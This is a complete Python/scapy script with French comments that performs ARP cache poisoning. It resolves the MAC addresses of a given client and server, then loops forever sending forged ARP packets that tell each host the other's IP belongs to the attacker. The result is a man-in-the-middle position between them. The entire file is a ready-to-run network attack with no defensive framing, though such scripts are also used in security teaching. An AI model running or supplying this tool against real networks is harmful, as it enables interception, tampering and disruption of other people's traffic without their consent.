#!/usr/bin/python3

from scapy.all import ARP, Ether, srp1, sendp
import sys
import time

ip_client = sys.argv[1]
ip_serveur = sys.argv[2]

# récupération de l'@ MAC du client
requete = Ether() / ARP(pdst=ip_client)
reponse = srp1(requete, timeout=5)

if reponse is None:
	print("Le client n'est pas accessible")
	exit()

mac_client = reponse[ARP].hwsrc

print(ip_client, mac_client)

# récupération de l'@ MAC du serveur
requete = Ether() / ARP(pdst=ip_serveur)
reponse = srp1(requete, timeout=5)

if reponse is None:
	print("Le serveur n'est pas accessible")
	exit()

mac_serveur = reponse[ARP].hwsrc

print(ip_serveur, mac_serveur)

# on crée le paquet pour attaquer le client
attaque_client = Ether(dst=mac_client) / ARP(psrc=ip_serveur)

# on crée le paquet pour attaquer le serveur
attaque_serveur = Ether(dst=mac_serveur) / ARP(psrc=ip_client)

while True:
	sendp(attaque_client)
	sendp(attaque_serveur)
	time.sleep(2)
